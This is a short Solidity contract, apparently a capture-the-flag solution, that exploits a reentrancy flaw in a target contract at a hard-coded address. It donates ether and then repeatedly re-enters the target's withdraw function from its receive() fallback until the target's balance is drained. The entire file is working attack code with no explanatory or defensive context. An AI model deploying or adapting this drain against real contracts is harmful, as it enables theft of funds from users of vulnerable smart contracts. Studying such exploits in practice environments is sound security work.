// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {IReentrance} from "src/reeantrancy/IReentrance.sol";

contract Reentered {
    IReentrance internal re =
        IReentrance(0xE935238D479616Be82d72e5c41A57267be7c35C1);
    uint amount = 0;

    function withdraw(uint _amount) public {
        re.withdraw(_amount);
    }

    function donate() public payable {
        amount = msg.value;
        re.donate{value: amount}(address(this));
    }

    receive() external payable {
        uint value = address(this).balance > amount
            ? amount
            : address(this).balance;
        re.withdraw(value);
    }
}
